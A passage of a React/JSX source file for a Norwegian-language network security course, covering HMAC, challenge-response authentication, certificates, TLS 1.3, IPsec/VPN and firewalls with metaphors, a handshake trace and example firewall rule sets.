      <Illustration caption="HMAC tar inn både meldingen og en delt nøkkel — uten nøkkelen kan ikke Trudy lage gyldig tag.">
        <HmacSvg />
      </Illustration>

      <Illustration caption="HMAC-konstruksjonen: nøkkelen XOR-es med to forskjellige padder (ipad/opad) og hashes i to runder. Dobbeltrunden er ikke pynt — den stopper length-extension-angrep mot SHA-1/SHA-256.">
        <HmacInnerOuterSvg />
      </Illustration>

      <Illustration caption="Hash, MAC og signering side om side: ulike garantier, ulike forutsetninger om hvem som deler hva.">
        <HashMacSignSvg />
      </Illustration>

      <Example title="Eksempel: signering av en pull request">
        <p>Når du commit-er kode til git med en GPG-signatur, skjer dette:</p>
        <ol className="list-decimal pl-5 mt-1">
          <li>
            git lager en tekst-representasjon av commiten (forfatter, dato, parent, tre-hash).
          </li>
          <li>SHA-256 hashes denne teksten — du får et 256-bits fingeravtrykk.</li>
          <li>Din private GPG-nøkkel signerer fingeravtrykket.</li>
          <li>Signaturen legges ved commiten og pushes til serveren.</li>
        </ol>
        <p className="mt-2">
          Hvem som helst med din offentlige GPG-nøkkel kan etterpå verifisere at akkurat den
          commiten er fra deg, og at ingen har endret den siden du signerte. Selv om noen får
          skrive-tilgang til git-repoet, kan de ikke forfalske signerte commits uten din private
          nøkkel.
        </p>
      </Example>

      <div className="rounded-lg border border-border bg-muted/20 p-3">
        <div className="text-sm font-semibold text-foreground mb-1">Praksis: PGP — signering + kryptering kombinert</div>
        <p className="text-xs text-muted-foreground mb-2">
          Signering og kryptering brukes som regel sammen i ekte protokoller. PGP («Pretty Good Privacy») er
          standardeksempelet på end-to-end-kryptert e-post som kombinerer hash, signering, AES og RSA i én pakke.
        </p>
        <Section85Live />
      </div>

      <RelatedSlugs slugs={["dte2507-fra-checksum-til-hmac"]} />
    </article>
  );
}

// ============================================================
// 8.4 — Autentisering
// ============================================================
function Section84() {
  return (
    <article className="space-y-4 text-sm">
      <Header num="8.4" title="Endepunkts-autentisering" />

      <Section84Live />

      <p className="text-muted-foreground">
        Hvordan kan Bob være sikker på at han faktisk snakker med Alice — og ikke med Trudy som
        later som hun er Alice? Vi bygger opp fra naive forsøk og forklarer hvorfor hvert av dem
        feiler, før vi lander på sertifikatbasert autentisering.
      </p>

      <div className="grid gap-3 lg:grid-cols-2">
        <VisualDefs
          items={[
            {
              term: "Forsøk 1: bare navn",
              icon: <NameOnlyIcon />,
              body: "«Jeg er Alice» — Trudy kan si det også. Feiler.",
            },
            {
              term: "Forsøk 2: passord i klartekst",
              icon: <PasswordClearIcon />,
              body: "Tjuvlytter snapper og spiller av. Feiler.",
            },
            { term: "Nonce", icon: <NonceIcon />, body: "Tilfeldig engangs-tall — knytter svaret til denne sesjonen." },
            {
              term: "Challenge-response",
              icon: <ChallengeResponseIcon />,
              body: "Bob ber, Alice signerer/MAC-er svaret med hemmelighet.",
            },
            {
              term: "Man-in-the-middle",
              icon: <MitmIcon />,
              body: "Trudy mellom A og B kjører to parallelle handshakes.",
            },
            {
              term: "Digitalt sertifikat",
              icon: <CertificateIcon />,
              body: "CA-signert (identitet, offentlig-nøkkel)-binding.",
            },
            { term: "PKI", icon: <PkiIcon />, body: "Systemet av CA-er, rotnøkler og trust stores." },
            { term: "Revoke / OCSP", icon: <RevokeIcon />, body: "Trekk tilbake kompromitterte sertifikater før utløp." },
            { term: "X.509-felter", icon: <X509FieldsIcon />, body: "Subject, Issuer, Validity, PubKey, SAN." },
            {
              term: "Sertifikat-utvidelser",
              icon: <CertExtensionIcon />,
              body: "KeyUsage, ExtKeyUsage, BasicConstraints, OCSP-peker.",
            },
            { term: "DV / OV / EV", icon: <ValidationLevelIcon />, body: "Tre nivåer av CA-validering — DV via ACME." },
            { term: "Chain-of-trust", icon: <ChainOfTrustIcon />, body: "Server → mellom-CA → rot-CA, hver signert opp." },
            { term: "CRL", icon: <CrlIcon />, body: "Stor ja/nei-liste over tilbaketrukne sertifikater." },
            { term: "OCSP-stapling", icon: <OcspStaplingIcon />, body: "Server leverer ferskt OCSP-svar selv." },
            {
              term: "Certificate Transparency",
              icon: <CtLogIcon />,
              body: "Offentlige logger — falske sertifikater oppdages.",
            },
            { term: "mTLS", icon: <MtlsIcon />, body: "Begge parter har sertifikat — sterk service-til-service-auth." },
            { term: "MFA", icon: <MfaIcon />, body: "To av: vet, har, er — FIDO2 er sterkest." },
          ]}
        />
        <Illustration caption="Challenge-response med signatur. Bob velger en fersk nonce; Alice beviser identitet ved å signere den.">
          <ChallengeResponseSvg />
        </Illustration>
      </div>

      <div className="grid gap-3 md:grid-cols-2">
        <Metafor tittel="Sertifikat er et pass">
          <p>
            Du dukker opp i et fremmed land. Grensevakta har aldri møtt deg. Men du leverer et pass
            utstedt av regjeringen, og grensevakta stoler ALLEREDE på regjeringen din. Han
            sammenligner ansiktet ditt med passet — og slipper deg inn. Bob trenger ikke å ha møtt
            Alice; han trenger bare å stole på CA-en som signerte passet hennes.
          </p>
        </Metafor>
        <Metafor tittel="Nonce er en tilfeldig PIN-utfordring">
          <p>
            Banken sier «hva er PIN-en din, men også kvitter med tallet 5824 jeg sender deg nå?»
            Hvis du svarer «PIN + 5824» riktig, vet banken at det er DENNE samtalen — ikke en
            innspilling fra forrige uke. Tallet endres hver gang, så gamle svar gjenbrukes ikke.
          </p>
        </Metafor>
        <Metafor tittel="Man-in-the-middle er en falsk tolk">
          <p>
            Du er på en forretningsreise og snakker via en tolk. Tolken later som han oversetter
            ord-for-ord til motparten, men endrer alt han vil. Begge parter tror de snakker med
            hverandre, men alt går gjennom tolken. Et forhåndsdelt anker (du har sett motpartens
            ansikt før, eller har et sertifikat fra ham) er det eneste forsvaret.
          </p>
        </Metafor>
        <Metafor tittel="MFA er låsen + nøkkelen + ansiktet">
          <p>
            En bil som krever (1) bilnøkkelen i lommen (har), (2) PIN-koden for å starte (vet), og
            (3) fingeravtrykk på rattet (er). Selv om en tyv stjeler nøkkelen, kan han ikke kjøre
            uten kode og finger. Hver faktor er en uavhengig barriere.
          </p>
        </Metafor>
      </div>

      <Hvorfor title="Hvorfor må nonce være tilfeldig og ikke bare øke monotont?">
        <p>
          En teller (1, 2, 3, ...) ville stoppet replay-angrep der angriper sender samme melding to
          ganger, men ikke <em>refleksjons-angrep</em>. Anta Alice og Bob bruker delt nøkkel og en
          teller. Trudy åpner to parallelle sesjoner mot Bob, samtidig som «klient» og «server», og
          krysser meldingene: når Bob ber om challenge i den ene sesjonen, sender Trudy den videre
          som sin egen challenge i den andre. Bob ender opp med å svare på sin egen utfordring og
          tror Trudy er Alice.
        </p>
        <p>
          En tilfeldig nonce (128+ bit fra kryptografisk PRNG) gjør dette praktisk umulig — sjansen
          for at to parallelle sesjoner får samme nonce er forsvinnende liten, og en angriper kan
          ikke forutsi neste verdi for å sette opp angrepet. Derfor sier TLS-spesifikasjonen
          eksplisitt at både client_random og server_random skal være 32 byte fra en CSPRNG.
        </p>
      </Hvorfor>

      <Illustration caption="Tillits-kjede: rot-CA → mellom-CA → server-sertifikat. Nettleseren har rot-CA i trust store fra fabrikken.">
        <PkiSvg />
      </Illustration>

      <Illustration caption="Autentisering bygger på tre uavhengige faktorer: noe du vet, noe du har, noe du er. To-faktor (2FA) krever ulike kategorier — ikke to passord.">
        <ThreeFactorsSvg />
      </Illustration>

      <Illustration caption="MITM-angrep: Trudy holder to parallelle handshakes; sertifikat-anker er det som blokkerer det.">
        <MitmSvg />
      </Illustration>

      <Example title="Eksempel: hvorfor en nonce må være fersk">
        <p>
          Tenk Alice og Bob bruker passordet «p123» direkte i en challenge: Bob sender en nonce N;
          Alice svarer h(p123 || N). Hvis Trudy klarer å få Bob til å gjenbruke samme N senere, kan
          hun spille av Alices gamle svar. Derfor må N være tilfeldig og aldri gjenbrukes — typisk
          minst 128 bit fra en kryptografisk PRNG.
        </p>
        <p className="mt-2 text-muted-foreground">
          Dette er også grunnen til at TLS-handshake har eksplisitte «client random» og «server
          random» felter på 32 byte hver.
        </p>
      </Example>

      <div className="rounded-lg border border-border bg-muted/20 p-3">
        <div className="text-sm font-semibold text-foreground mb-1">Praksis: WiFi-handshakes — WEP, WPA2, WPA3</div>
        <p className="text-xs text-muted-foreground mb-2">
          Endepunkts-autentisering er ikke bare for HTTPS. Hver gang du kobler en laptop til WiFi, kjører det en
          handshake mellom klient og access point. Tre generasjoner viser hvordan tenkningen har modnet:
          fra en statisk delt nøkkel (WEP, knust) via 4-way handshake (WPA2, sårbar for offline-dict) til SAE
          i WPA3 (motstandsdyktig).
        </p>
        <Section88Live />
      </div>

      <RelatedSlugs slugs={["nettverkssikkerhet"]} />
    </article>
  );
}

// ============================================================
// 8.5 — TLS
// ============================================================
function Section85() {
  return (
    <article className="space-y-4 text-sm">
      <Header num="8.5" title="TLS — sikker transport for alt" />

      <Section86Live />

      <p className="text-muted-foreground">
        TLS er det praktiske resultatet av kapittelets første halvdel. Den kombinerer asymmetrisk
        autentisering (sertifikater), nøkkelutveksling (DH), symmetrisk kryptering (AES-GCM), og MAC
        i én protokoll som ligger rett over TCP. Når du ser hengelåsen i nettleseren, er det TLS du
        ser.
      </p>

      <div className="grid gap-3 lg:grid-cols-2">
        <VisualDefs
          items={[
            { term: "TLS-record", icon: <TlsRecordIcon />, body: "Header + kryptert+autentisert payload-enhet." },
            { term: "Handshake-faser", icon: <HandshakeIcon />, body: "Hilse → server-auth → DH → bekreftelse → app-data." },
            {
              term: "Cipher suite",
              icon: <CipherSuiteIcon />,
              body: "Forhandlet algoritme-pakke, f.eks. AES_128_GCM_SHA256.",
            },
            { term: "Forward Secrecy", icon: <ForwardSecrecyIcon />, body: "Server-lekk i ettertid bryter ikke gamle sesjoner." },
            { term: "Master secret", icon: <MasterSecretIcon />, body: "DH-resultat → HKDF → trafikk-nøkler per retning." },
            { term: "Session resumption", icon: <SessionResumptionIcon />, body: "PSK fra forrige sesjon — handshake kortes ned." },
            { term: "TLS 1.3 forenkling", icon: <Tls13Icon />, body: "Bare AEAD, kun (EC)DHE, 1-RTT." },
            { term: "ClientHello + SNI", icon: <ClientHelloIcon />, body: "Klientens første pakke — hvilket domene." },
            { term: "ServerHello", icon: <ServerHelloIcon />, body: "Server velger cipher, leverer DH-andel + sertifikat." },
            { term: "Finished", icon: <FinishedMacIcon />, body: "MAC over hele handshake-historikk — fanger tukling." },
            { term: "0-RTT", icon: <ZeroRttIcon />, body: "App-data sammen med ClientHello (PSK) — replay-risiko." },
            { term: "HKDF", icon: <HkdfIcon />, body: "HMAC-basert nøkkel-avledning — tre av nøkler." },
            {
              term: "Downgrade-angrep",
              icon: <DowngradeIcon />,
              body: "Tvinger ned til svakere versjon — SCSV stopper det.",
            },
            { term: "QUIC + TLS 1.3", icon: <QuicIcon />, body: "TLS integrert i transport over UDP — HTTP/3." },
            { term: "ALPN", icon: <AlpnIcon />, body: "Forhandler applikasjons-protokoll (h2, h3, http/1.1)." },
          ]}
        />
        <Illustration caption="TLS 1.3 handshake — én RTT før applikasjons-data kan sendes. ServerHello inneholder sertifikat og DH-andel.">
          <TlsHandshakeSvg />
        </Illustration>
      </div>

      <div className="grid gap-3 md:grid-cols-2">
        <Metafor tittel="TLS-handshake er et formelt møte">
          <p>
            «Hei, jeg er Alice» (ClientHello). «Bevis det» (ServerHello + sertifikat-utfordring).
            «Her er passet mitt — utstedt av regjeringen du stoler på» (Certificate). «OK, la oss
            blande en hemmelig håndtrykk-bevegelse ingen andre kjenner» (DH). «Skal vi snakke
            kryptert nå?» (Finished). Hele rituale er tegnet inn på forhånd — én misforståelse, og
            avtalen brytes.
          </p>
        </Metafor>
        <Metafor tittel="Forward Secrecy er ferske møterom">
          <p>
            En sjef møter ulike ansatte i en stor virksomhet. Med RSA-key-exchange møter han alle i
            samme arkivrom — innholdet skrives ned i én bok med ett lås. Stjeles nøkkelen, avsløres
            alt. Med ECDHE går han i et nytt møterom for HVERT møte, og brenner møte- referatet
            etter møtet. Nøkkelen til arkivet stjeler ingen senere — det er ingen arkiv.
          </p>
        </Metafor>
        <Metafor tittel="0-RTT er postordre uten å vente på katalogen">
          <p>
            Du har handlet på samme nettbutikk før, så du vet allerede prisene. Du sender
            bestillingen sammen med kortet ditt, uten å vente på en ny katalog. Sparer tid — men
            hvis en kopist har snappet bestillingen, kan den sendes på nytt og kortet trekkes en
            gang til. Derfor: kun for idempotente operasjoner (henting, ikke betaling).
          </p>
        </Metafor>
        <Metafor tittel="SNI er hotell-resepsjonen">
          <p>
            Én bygning huser ti hoteller (én IP, ti domener). Du må si i resepsjonen hvilket hotell
            du leter etter, ellers vet ikke portieren hvilken kjede-uniform han skal ta på. Det er
            SNI — uten den ville én IP bare kunne håndtere ett HTTPS-domene.
          </p>
        </Metafor>
      </div>

      <Hvorfor title="Hvorfor dropper TLS 1.3 RSA-key-exchange?">
        <p>
          I gammel RSA-key-exchange genererte klienten et pre-master secret og krypterte det med
          serverens offentlige RSA-nøkkel. Server dekrypterte med sin private nøkkel. Det fungerer —
          men gir <em>ingen forward secrecy</em>: hele sesjonens sikkerhet avhenger av at serverens
          langlivede private nøkkel aldri lekker. En angriper som logger ciphertext-trafikk i fem år
          og deretter — via et innbrudd, en hjemmel, en utpressing — får tak i den private nøkkelen,
          kan dekryptere alle de fem årene med kommunikasjon.
        </p>
        <p>
          (EC)DHE løser dette ved at hver part lager et ferskt, kortlivd DH-nøkkelpar bare for den
          ene handshaken. Det delte hemmeligheten utledes av disse éphemeral-nøklene, og de blir
          slettet umiddelbart etterpå. Serverens langlivede nøkkel brukes bare til å signere
          DH-andel (autentisering), ikke til selve nøkkelutvekslingen. Lekkasje i ettertid lar
          angriper falske fremtidige handshakes, men gamle sesjoner forblir trygge. TLS 1.3 gjør
          derfor (EC)DHE obligatorisk og fjerner RSA-key-exchange helt.
        </p>
      </Hvorfor>

      <Illustration caption="Forward Secrecy: RSA-key-exchange (venstre) lekker alle gamle sesjoner ved server-lekk; ECDHE (høyre) gjør ikke det.">
        <ForwardSecrecySvg />
      </Illustration>

      <Example title="Eksempel: regn ut hva som er trygt etter at server-nøkkelen lekker">
        <p>
          Anta at Trudy har samlet et halvt år med kryptert trafikk mot en bank, og en dag stjeler
          hun bankens private RSA-nøkkel.
        </p>
        <ul className="list-disc pl-5 mt-1">
          <li>
            <strong>TLS 1.2 med RSA-key-exchange:</strong> klient krypterte pre-master med bankens
            offentlige nøkkel. Trudy kan nå dekryptere pre-master fra alle gamle handshakes →
            dekryptere all gammel trafikk. Katastrofe.
          </li>
          <li>
            <strong>TLS 1.3 (eller TLS 1.2 med ECDHE):</strong> pre-master kom fra en éphemeral
            DH-utveksling som ble kastet rett etter handshake. Bankens private nøkkel ble bare brukt
            til å signere ECDHE-andelen. Trudy kan ikke utlede pre-master fra de offentlige
            DH-verdiene hun har samlet. Gamle sesjoner er trygge.
          </li>
        </ul>
        <p className="mt-2 text-muted-foreground">
          Dette er hvorfor Forward Secrecy er obligatorisk i TLS 1.3.
        </p>
      </Example>

      <Example title="Eksempel: TLS 1.3 handshake-trace, melding for melding">
        <p>
          La oss følge en typisk handshake mellom en nettleser og banken
          <code> sparebank.example.no</code>:
        </p>
        <pre className="mt-2 rounded bg-muted/30 p-2 font-mono text-[11px] overflow-x-auto">
          {`Klient ─────────────────────────────────────────────── Server
   ClientHello {
     versions:   [TLS 1.3, TLS 1.2]
     cipher_suites: [TLS_AES_128_GCM_SHA256, ...]
     supported_groups: [x25519, secp256r1]
     key_share:   x25519 = (klient_pub)
     SNI:         sparebank.example.no
     client_random: 32 bytes (CSPRNG)
   }                                       ────────────►

                                           ◄────────────  ServerHello {
                                              version:    TLS 1.3
                                              cipher:     TLS_AES_128_GCM_SHA256
                                              key_share:  x25519 = (server_pub)
                                              server_random: 32 bytes
                                           }
                                           ── { handshake_secret avledes på begge sider } ──
                                                          {Certificate, sertifikat-kjede}
                                                          {CertificateVerify, signatur over transkript}
                                                          {Finished, MAC over transkript}
   {verifiserer sertifikat-kjede}
   {verifiserer CertificateVerify mot pubkey i sertifikatet}
   {verifiserer Finished-MAC}
   {Finished, MAC over transkript}        ────────────►

   ── { application_traffic_secret avledes; tunnel åpen } ──
   {GET / HTTP/1.1, Host: sparebank.example.no}  ───────►
                                           ◄────────────  {HTTP/1.1 200 OK, ...}`}
        </pre>
        <p className="mt-2 text-muted-foreground">
          Merk at sertifikatet sendes ETTER ServerHello og er kryptert med handshake_traffic_secret
          — det betyr at en passiv observatør ikke ser hvilken server klienten autentiserer. Bare
          SNI (i ClientHello) avslører servernavnet, og ECH gjør også det skjult.
        </p>
      </Example>

      <RelatedSlugs slugs={["tls", "dte2507-tls-handshake", "dte2507-tls-handshake-lab"]} />
    </article>
  );
}

// ============================================================
// 8.6 — IPsec & VPN
// ============================================================
function Section86() {
  return (
    <article className="space-y-4 text-sm">
      <Header num="8.6" title="IPsec og VPN" />

      <Section87Live />

      <p className="text-muted-foreground">
        TLS sikrer applikasjons-laget — du må programmere det inn i hver app. IPsec sikrer
        nettverks-laget — alle pakker mellom to noder kan beskyttes uten at applikasjonen vet om
        det. Det er ryggraden i bedrifts-VPN-er og i site-to-site-tunneler mellom kontorer.
      </p>

      <div className="grid gap-3 lg:grid-cols-2">
        <VisualDefs
          items={[
            { term: "AH", icon: <AhIcon />, body: "Integritet+auth, INGEN kryptering. Sjeldent alene." },
            { term: "ESP", icon: <EspIcon />, body: "Konfidensialitet + integritet. Standard-valg i dag." },
            {
              term: "Transport-mode",
              icon: <TransportModeIcon />,
              body: "Original IP-header beholdes, bare payload krypteres.",
            },
            { term: "Tunnel-mode", icon: <TunnelModeIcon />, body: "Hele pakken pakkes inn i ny ytre IP — VPN-tunnel." },
            {
              term: "SA (Security Association)",
              icon: <SaIcon />,
              body: "Enveis avtale: protokoll, modus, nøkler, SPI.",
            },
            { term: "IKE", icon: <IkeIcon />, body: "Forhandler SA-er og avtaler DH-nøkler — IKEv2 standard." },
            {
              term: "Anti-replay-vindu",
              icon: <AntiReplayIcon />,
              body: "Sekvensnummer i glidende vindu, gamle pakker avvises.",
            },
            { term: "SPI", icon: <SpiIcon />, body: "32-bit ID som peker til riktig SA i SAD." },
            {
              term: "SAD og SPD",
              icon: <SadSpdIcon />,
              body: "SAD: aktive SA-er. SPD: policy hvilken trafikk beskyttes.",
            },
            { term: "IKEv2-faser", icon: <Ikev2PhasesIcon />, body: "IKE_SA_INIT + IKE_AUTH → CHILD_SA-er for trafikk." },
            { term: "PFS i IPsec", icon: <ForwardSecrecyIcon />, body: "Hver child-SA får fersk DH — gammel trafikk trygg." },
            { term: "NAT-traversal", icon: <NatTraversalIcon />, body: "ESP innkapslet i UDP 4500 — passerer NAT." },
            { term: "WireGuard", icon: <WireguardIcon />, body: "Moderne VPN — 1 cipher suite, ~4000 linjer kode." },
            {
              term: "Site-to-site vs remote",
              icon: <SiteToSiteIcon />,
              body: "Gateway-til-gateway vs bruker-til-konsentrator.",
            },
            {
              term: "Split vs full tunneling",
              icon: <SplitTunnelIcon />,
              body: "Bare bedrift, eller all trafikk gjennom VPN.",
            },
            {
              term: "Hva IPsec ikke gir",
              icon: <InsiderIcon />,
              body: "Ingen app-lag-filter, ingen bruker-auth, ingen insider-forsvar.",
            },
          ]}
        />
        <Illustration caption="Tunnel-mode: hele original-pakken pakkes inn i en ny IP+ESP-pakke. De interne adressene er skjult.">
          <IpsecTunnelSvg />
        </Illustration>
      </div>

      <div className="grid gap-3 md:grid-cols-2">
        <Metafor tittel="Tunnel-mode er en pansret busstransport">
          <p>
            Kontoret i Oslo og kontoret i Bergen ligger i samme «interne by» (10.0.0.0/16). For å få
            post mellom dem må alle pakkene legges i en pansret buss med Oslo-gateway og
            Bergen-gateway som offentlige adresser. Internett ser bare bussen kjøre — ikke hvem som
            sitter inni eller hva de snakker om. Inni bussen er pakkene fortsatt adressert til de
            interne adressene; det åpnes først når bussen er inne i Bergen.
          </p>
        </Metafor>
        <Metafor tittel="Transport-mode er konvolutt rundt brev">
          <p>
            To bedrifter med egne offentlige postadresser sender brev til hverandre. Postsystemet
            (internett) trenger ikke pakke om brevet — adressene står allerede utenpå. De legger
            bare en forseglet konvolutt rundt selve innholdet. Mindre overhead, men forutsetter at
            både avsender og mottaker allerede er rutbare i posten.
          </p>
        </Metafor>
        <Metafor tittel="SA er et signert reise-kontrakt">
          <p>
            To partnere bestemmer på forhånd: «vi snakker via ESP, med AES-GCM, denne nøkkelen,
            denne sekvensteller, og kontrakten har ID-nummer 0x7f3a». Hver pakke ber så vakta sjekke
            kontrakt 0x7f3a. En egen kontrakt for hver retning av samtalen, derfor TO SA-er for et
            fullt to-veis-rør.
          </p>
        </Metafor>
        <Metafor tittel="NAT-traversal er pakke-i-pakke">
          <p>
            ESP er en spesiell type «pakke» som hjemme-ruteren din ikke gjenkjenner — den vet
            hvordan TCP og UDP fungerer, ikke protokoll 50. Løsningen er å putte ESP-pakken inni en
            UDP-konvolutt på port 4500. Nå ser ruteren UDP, sporer den fint, og pakker ut på andre
            siden.
          </p>
        </Metafor>
      </div>

      <Hvorfor title="Hvorfor velger man tunnel-mode mellom kontorer, men transport-mode for host-til-host?">
        <p>
          Forskjellen handler om hva slags adressering som finnes på endepunktene. To kontor-LAN-er
          har private adresser (10.x eller 192.168.x) som ikke kan rutes over internett. Hvis vi
          bare krypterte payload-en og lot interne adresser stå i header (transport-mode), ville
          mellomliggende rutere nektet å videresende pakken — de vet ikke hvor 10.0.2.7 ligger.
          Tunnel-mode kapsler hele pakken inn i en ny ytre IP-header med de offentlige
          gateway-adressene, så internett ser bare gateway-til-gateway-trafikk.
        </p>
        <p>
          For to enkelt-hosts som allerede har offentlige, rutbare adresser (eks. to servere som vil
          snakke trygt direkte) er det ingen grunn til å bære byrden av en ekstra IP-header på 20
          byte per pakke. Transport-mode beholder den originale headeren og krypterer bare payload,
          og er dermed mer effektivt. Som regel: hvis endepunktene snakker sammen via gateways som
          beskytter andre, bruk tunnel; hvis de snakker direkte, bruk transport.
        </p>
      </Hvorfor>

      <Illustration caption="Transport-mode vs tunnel-mode: hvor mye av original-pakken som blir kapslet inn.">
        <TransportVsTunnelSvg />
      </Illustration>

      <Illustration caption="ESP- og AH-pakke-layout side-ved-side. ESP krypterer payload og autentiserer fra ESP-header til ICV; AH autentiserer hele pakken inkl. ytre IP-header — og brytes derfor av NAT.">
        <EspPacketLayoutSvg />
      </Illustration>

      <Example title="Eksempel: når bør du velge tunnel-mode?">
        <p>
          Et selskap har et hovedkontor i Oslo og en filial i Bodø. De vil at interne IP-er
          (10.0.0.0/16) skal være rutbar mellom kontorene.
        </p>
        <ul className="list-disc pl-5 mt-1">
          <li>En IPsec-tunnel etableres mellom de to gateway-ene (deres offentlige IP-er).</li>
          <li>
            En arbeidsstasjon 10.0.1.5 i Oslo pinger 10.0.2.7 i Bodø. Pakken ankommer
            Oslo-gateway-en med interne adresser i headeren.
          </li>
          <li>
            Gateway-en krypterer hele pakken (inkludert interne adresser), pakker den i en ny
            IP-pakke med offentlige source/dest, og sender den over internett.
          </li>
          <li>
            Bodø-gateway-en mottar, dekrypterer, og leverer originalpakken videre inn i 10.0.2.0/24.
          </li>
        </ul>
        <p className="mt-2 text-muted-foreground">
          Underveis ser internett bare gateway-til-gateway-trafikk. Selv hvilke interne maskiner som
          snakker sammen er skjult.
        </p>
      </Example>

      <RelatedSlugs slugs={["nettverkssikkerhet"]} />
    </article>
  );
}

// ============================================================
// 8.7 — Brannmurer
// ============================================================
function Section87() {
  return (
    <article className="space-y-4 text-sm">
      <Header num="8.7" title="Brannmurer — hvem som slipper inn" />

      <p className="text-muted-foreground">
        En brannmur sitter på en pakkes vei og bestemmer hvilke pakker som får passere. Den er det
        første forsvars-laget mellom et internt nett og internett. Det finnes flere generasjoner —
        stateless, stateful, og applikasjons-bevisst — med ulike trade-offs.
      </p>

      <div className="grid gap-3 lg:grid-cols-2">
        <VisualDefs
          items={[
            { term: "Stateless pakkefilter", icon: <StatelessFilterIcon />, body: "Hver pakke alene — ingen hukommelse om flow." },
            {
              term: "Stateful inspeksjon",
              icon: <StatefulFilterIcon />,
              body: "Conntrack-tabell over åpne flows — svar slippes inn.",
            },
            { term: "Default deny", icon: <DefaultDenyIcon />, body: "Alt som ikke eksplisitt tillates, avvises." },
            { term: "Implicit deny", icon: <ImplicitDenyIcon />, body: "Siste regel: «deny all» fanger det som glapp." },
            {
              term: "Applikasjons-brannmur",
              icon: <AppFirewallIcon />,
              body: "Proxy som forstår HTTP/SMTP-innhold, ikke bare port.",
            },
            { term: "Tunneling/smugling", icon: <TunnelSmugglingIcon />, body: "Angriper gjemmer SSH inni TLS på 443." },
            { term: "Egress-filtrering", icon: <EgressIcon />, body: "Filtrer utgående — stopper malware-kall hjem." },
            {
              term: "Conntrack-tabell",
              icon: <ConntrackIcon />,
              body: "(proto, src, dst, port, tilstand, timer) per flow.",
            },
            { term: "NGFW", icon: <NgfwIcon />, body: "Stateful + app-ID + IPS i ett produkt." },
            { term: "WAF", icon: <WafIcon />, body: "App-brannmur for HTTP — OWASP Top 10-mønstre." },
            { term: "DMZ", icon: <DmzIcon />, body: "Mellom-segment for offentlige tjenester — buffer mot LAN." },
            { term: "Zero-trust", icon: <ZeroTrustIcon />, body: "«Innsiden er ikke trygg» — auth+autoriser hver request." },
            {
              term: "iptables / nftables",
              icon: <IptablesIcon />,
              body: "Linux pakkefilter — tabeller → kjeder → regler.",
            },
          ]}
        />
        <Illustration caption="Regel-evaluering i et pakkefilter — top-down match, første treff bestemmer, deny som siste regel.">
          <FirewallRulesSvg />
        </Illustration>
      </div>

      <div className="grid gap-3 md:grid-cols-2">
        <Metafor tittel="Brannmur er vakta på døra">
          <p>
            «Hvem er du? Hva vil du?» Hvis du står på lista, slipper du inn. Hvis ikke, snur du. En
            stateless vakt har bare lista. En stateful vakt husker også: «Aha, du gikk ut for 5 min
            siden og snakket med Tom — så når svar fra Tom kommer, slipper jeg det også inn».
            Default deny betyr at vakta er konservativ: er du i tvil, snu.
          </p>
        </Metafor>
        <Metafor tittel="DMZ er et venterom">
          <p>
            Bedriften har et besøks-venterom mellom hovedinngangen og den indre kontordelen. Alle
            kunder må vente i venterommet — får ikke gå inn i selve kontoret. Hvis venterommet
            angripes, må angriperen bryte en ekstra dør for å nå data. Web-server og mail-server er
            i venterommet; databasen er i kontoret.
          </p>
        </Metafor>
        <Metafor tittel="Stateful er en hotell-portier">
          <p>
            Portieren ser deg sjekke inn (åpne en TCP-forbindelse), noterer romnummer og navn, og
            slipper inn bare folk som spør etter DEG (svar-pakker). Gjester som dukker opp
            uoppfordret og spør etter «hvilket som helst rom over 1024» avvises. En stateless
            portier hadde måttet la alle høyere romnumre stå åpne for sikkerhets skyld.
          </p>
        </Metafor>
        <Metafor tittel="Zero-trust er flyplass-sikkerhet">
          <p>
            Også ansatte må gjennom metalldetektoren, hver dag. Det å bare være «innenfor
            perimeteren» (på bedriftens LAN) er ikke nok. Hver request, hver tjeneste-til-tjeneste-
            kall, blir autentisert på nytt. Hvis en maskin er kompromittert, sprer ikke angriperen
            seg fritt.
          </p>
        </Metafor>
      </div>

      <Hvorfor title="Hvorfor er stateful inspeksjon nesten alltid bedre enn stateless?">
        <p>
          Tenk på en intern bruker som henter en webside fra en utvendig server. TCP-håndtrykket er
          klient: SYN, server: SYN-ACK, klient: ACK — etter det flyter data fritt begge veier.
          Klientens kildeport er en ephemeral port (eks. 49152). En stateless brannmur som vil
          tillate svar-pakkene må åpne ALLE høye porter (1024-65535) for innkommende trafikk fra
          utlandet, fordi den ikke kan forutsi hvilken ephemeral-port klienten valgte. Det betyr i
          praksis at hele interne LAN er åpent for skann fra utenfra på alle høye porter.
        </p>
        <p>
          En stateful brannmur ser SYN-en gå ut, legger (klient-IP, 49152, server-IP, 80) inn i sin
          conntrack-tabell, og ETTER det slipper bare gjennom innkommende pakker som matcher den
          flow-en. Ingen åpne ephemeral-porter for verden — bare for det ene utgående
          forbindelses-paret. Forskjellen er enorm i angreps-overflate, og den eneste reelle
          kostnaden er minne for conntrack-tabellen. Derfor er stateless pakkefilter i dag bare
          relevant for høyhastighets-edge der man ikke har tid til lookup, og selv der er det ofte
          hardware-stateful.
        </p>
      </Hvorfor>

      <Illustration caption="DMZ-topologi: web og mail i ytre sone, interne data i indre sone, brannmurer på begge grenser.">
        <DmzSvg />
      </Illustration>

      <Illustration caption="Tre brannmur-generasjoner: stateless filter ser bare IP/port; stateful holder conntrack-tabell; app-gateway/WAF ser HTTP-innhold. Hver legger ett lag på toppen av forrige.">
        <FirewallStacksSvg />
      </Illustration>

      <Example title="Eksempel: regelsett for en liten bedrift">
        <p>
          Bedriften vil at interne hosts skal kunne nå hva som helst på web; men ingen utenfra skal
          kunne koble til noe internt unntatt en mailserver på 10.0.0.25 (SMTP) og en webserver på
          10.0.0.80 (HTTP/HTTPS).
        </p>
        <pre className="mt-2 rounded bg-muted/30 p-2 font-mono text-[11px] overflow-x-auto">
          {`# Inn fra internett
1. allow tcp any  -> 10.0.0.25  port 25      # SMTP til mail
2. allow tcp any  -> 10.0.0.80  port 80,443  # web
3. allow tcp any  -> 10.0.0.0/24 established # svar på utgående
4. deny  any  any -> any                     # alt annet inn

# Ut fra LAN
5. allow tcp 10.0.0.0/24 -> any  port 80,443,53,25
6. deny  any -> any`}
        </pre>
        <p className="mt-2 text-muted-foreground">
          Regel 3 («established») er stateful-essensen — uten den hadde svar på utgående
          forespørsler blitt droppet av regel 4.
        </p>
      </Example>

      <Example title="Eksempel: regel-evaluering pakke for pakke">
        <p>Vi har dette regelsettet (top-down, første match vinner):</p>
        <pre className="mt-2 rounded bg-muted/30 p-2 font-mono text-[11px] overflow-x-auto">
          {`1. allow tcp 10.0.0.0/24 -> any            port 80,443  (web ut)
